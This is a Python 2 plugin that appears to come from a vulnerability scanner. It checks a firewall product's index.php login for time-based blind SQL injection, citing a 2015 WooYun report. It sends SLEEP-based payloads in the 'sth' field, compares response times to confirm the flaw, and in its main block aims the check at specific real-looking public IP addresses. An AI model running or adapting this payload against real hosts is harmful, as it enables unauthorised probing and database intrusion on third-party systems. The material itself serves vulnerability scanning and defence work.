#!/usr/bin/env python
#-*- coding: utf-8 -*-
#ref:http://www.wooyun.org/bugs/wooyun-2015-0140977
import time

import urlparse
def assign(service, arg):
    if service == "kill_firewall":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    poc = arg+'index.php?action=relogin&sth=556&nickname=admin&warning=%B5%C7%C2%BC%CA%A7%B0%DC%A3%A1%D3%C3%BB%A7%C3%FB%BB%F2%C3%DC%C2%EB%B4%ED%CE%F3%A3%AC%C7%EB%C1%AA%CF%B5%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1%A3%A1%3Cbr%3ELogin+failed%21+username+or+password+error%2CPlease+contact+system+administrators%21'
    postdata1='nickname=123&pass=123&Submit=%B5%C7%C2%BC%28Submit%29&sth=550%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))EczG)&action=login'
    postdata2='nickname=123&pass=123&Submit=%B5%C7%C2%BC%28Submit%29&sth=550%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))EczG)&action=login'
    timea=time.time()
    code1, head, res, errcode, _ = curl.curl2(poc,post=postdata1)
    timeaend = time.time()-timea
    timeb=time.time()
    code2, head, res, errcode, _ = curl.curl2(poc,post=postdata2)
    timebend = time.time()-timeb
    if code1==302 and code2==302 and timebend - timeaend > 3.5:
        security_hole(poc+", can be sqli ,ref:http://www.wooyun.org/bugs/wooyun-2015-0140977")

if __name__ == '__main__':
    from dummy import *
    #audit(assign("www", 'https://210.73.59.253/')[1])
    audit(assign("kill_firewall", 'https://106.39.114.235/')[1])